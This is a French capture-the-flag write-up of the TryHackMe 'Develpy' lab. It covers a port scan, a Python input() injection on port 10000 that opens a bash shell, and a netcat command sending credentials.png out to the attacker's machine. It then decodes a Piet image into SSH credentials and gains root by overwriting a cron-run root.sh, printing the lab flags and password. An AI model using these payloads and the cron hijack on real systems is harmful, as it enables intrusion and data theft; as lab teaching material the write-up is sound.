# Develpy #

## Task 1 Develpy ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.165.31 develpy.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A develpy.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-21 16:25 CEST
Nmap scan report for develpy.thm (10.10.165.31)
Host is up (0.034s latency).
rDNS record for 10.10.165.31: title.thm
Not shown: 65533 closed ports
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.91%I=7%D=8/21%Time=61210CE3%P=x86_64-pc-linux-gnu%r(N
SF:ULL,48,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x2
SF:0Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20")%
SF:r(GetRequest,136,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\
SF:r\n\r\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?
SF:\?:\x20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File
SF:\x20\"\./exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20
SF:\x20num_exploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x2
SF:0of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<strin
SF:g>\",\x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'GET'\x2
SF:0is\x20not\x20defined\r\n")%r(HTTPOptions,13A,"\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20o
SF:f\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20ca
SF:ll\x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20i
SF:n\x20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20
SF:Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\
SF:)\r\n\x20\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\r\nN
SF:ameError:\x20name\x20'OPTIONS'\x20is\x20not\x20defined\r\n")%r(RTSPRequ
SF:est,13A,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x
SF:20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20Tr
SF:aceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\x20\"\./
SF:exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20\x20num_e
SF:xploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x20of\x20ex
SF:ploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<string>\",\x20
SF:line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'OPTIONS'\x20is\x
SF:20not\x20defined\r\n")%r(GenericLines,13B,"\r\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of\x2
SF:0exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20call\x
SF:20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20in\x2
SF:0<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20Plea
SF:se\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\
SF:n\x20\x20File\x20\"<string>\",\x20line\x200\r\n\x20\x20\x20\x20\r\n\x20
SF:\x20\x20\x20\^\r\nSyntaxError:\x20unexpected\x20EOF\x20while\x20parsing
SF:\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/21%OT=22%CT=1%CU=43885%PV=Y%DS=2%DC=T%G=Y%TM=61210D6
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   34.14 ms 10.9.0.1
2   34.40 ms title.thm (10.10.165.31)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.08 seconds
```

On remarque qui y a deux servies :   
Le service SSH sur le port 22.
Un service inconnu sur le port 10000.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ telnet develpy.thm 10000
Trying 10.10.165.31...
Connected to develpy.thm.
Escape character is '^]'.

        Private 0days

 Please enther number of exploits to send??: 1

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.031 ms
Connection closed by foreign host.

tim@kali:~/Bureau/tryhackme/write-up$ telnet develpy.thm 10000
Trying 10.10.165.31...
Connected to develpy.thm.
Escape character is '^]'.

        Private 0days

 Please enther number of exploits to send??: a
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
NameError: name 'a' is not defined
Connection closed by foreign host.
```

Avec telnet on vérifie les entrées quand on met un nombre ça fonctionne, sinon avec des lettres ça plante.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ telnet develpy.thm 10000
Trying 10.10.165.31...
Connected to develpy.thm.
Escape character is '^]'.

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('bash')
bash: cannot set terminal process group (750): Inappropriate ioctl for device
bash: no job control in this shell
king@ubuntu:~$ king@ubuntu:~$ 
```

Avec __import_\('os\).system\('bash'\) on obtient un shell.    


**user.txt**

```bash
king@ubuntu:~$ king@ubuntu:~$ id
uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)

king@ubuntu:~$ king@ubuntu:~$ cat user.txt	
cf85ff769cfaaa721758949bf870b019
```

Une fois que l'on le shell on trouve le premier flag dans user.txt.   

La réponse : cf85ff769cfaaa721758949bf870b019    

**root.txt**

```bash
king@ubuntu:~$ king@ubuntu:~$ ls 
credentials.png  exploit.py  root.sh  run.sh  user.txt

------------------------------

tim@kali:~/Bureau/tryhackme/write-up$ nc -l -p 1234 > credentials.png

------------------------------

king@ubuntu:~$ king@ubuntu:~$ nc 10.9.228.66 1234 < credentials.png

------------------------------

```

On télécharge sur notre machine le fichier credentials.png.    

![page1](./Task1-01.png)

On remarque le fichier est en npiet.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget http://www.bertnase.de/npiet/npiet-1.3f.c -nv
2021-08-21 17:28:09 URL:http://www.bertnase.de/npiet/npiet-1.3f.c [68150/68150] -> "npiet-1.3f.c" [1]
tim@kali:~/Bureau/tryhackme/write-up$ cc npiet-1.3f.c -o npiet-1.3f
```

On compile npiet.   

```python
tim@kali:~/Bureau/tryhackme/write-up$ cat image.py 
from PIL import Image

im = Image.open('credentials.png')
im = im.convert('RGB')
im.mode
im.save('credentials.ppm')
```
```bash
tim@kali:~/Bureau/tryhackme/write-up$ python3 image.py 
/usr/lib/python3/dist-packages/PIL/Image.py:962: UserWarning: Palette images with Transparency expressed in bytes should be converted to RGBA images
  warnings.warn(
```

On écrit un scrip pour convertir l'image de png à ppm.     

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ./npiet-1.3f credentials.ppm 
king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c00ffe123!king:c0...
```

On récupère des identifiants :     
Nom : king   
Mot de passe : c00ffe123!

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh king@develpy.thm
The authenticity of host 'develpy.thm (10.10.165.31)' can't be established.
ECDSA key fingerprint is SHA256:ldEehLBRmBzbX2HAONhhDHk/abFgBrtgtSwM+IvBD4Q.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'develpy.thm,10.10.165.31' (ECDSA) to the list of known hosts.
king@develpy.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Tue Aug 27 11:21:54 2019 from 192.168.20.234

king@ubuntu:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	king	cd /home/king/ && bash run.sh
*  *	* * *	root	cd /home/king/ && bash root.sh
*  *	* * *	root	cd /root/company && bash run.sh

```

Dans le crontab on voit qu'il exécute root.sh avec les droits root. 

```bash
king@ubuntu:~$ ls -al root.sh 
-rw-r--r-- 1 root root 32 Aug 25  2019 root.sh

king@ubuntu:~$ ls -al  ../
total 12
drwxr-xr-x  3 root root 4096 Aug 25  2019 .
drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
drwxr-xr-x  4 king king 4096 Aug 27  2019 king

king@ubuntu:~$ rm root.sh 

rm: remove write-protected regular file 'root.sh'? y

king@ubuntu:~$ echo "cat /root/root.txt > /tmp/flag.txt" > root.sh

king@ubuntu:~$ chmod +x root.sh 
```

Comme on possède les droits d'écriture sur le répertoire king, je peux éffacer le fichier root.sh.    
On refait le même fichier avec pour instruction de mettre le contenue de root.txt dans /tmp/flag.txt.   
Om met les droits.    
On attend 1 min.    

```bash
king@ubuntu:~$ cat /tmp/flag.txt 
9c37646777a53910a347f387dce025ec
````

La réponse : 9c37646777a53910a347f387dce025ec     